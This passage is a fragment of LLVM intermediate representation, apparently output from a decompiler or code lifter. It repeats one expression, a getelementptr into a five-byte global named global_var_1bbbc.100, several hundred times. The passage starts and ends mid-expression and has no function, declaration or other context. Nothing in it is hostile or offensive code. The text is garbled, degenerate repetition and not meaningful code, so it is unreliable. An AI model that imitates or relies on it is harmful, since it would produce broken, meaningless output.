@global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bbbc.100, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* 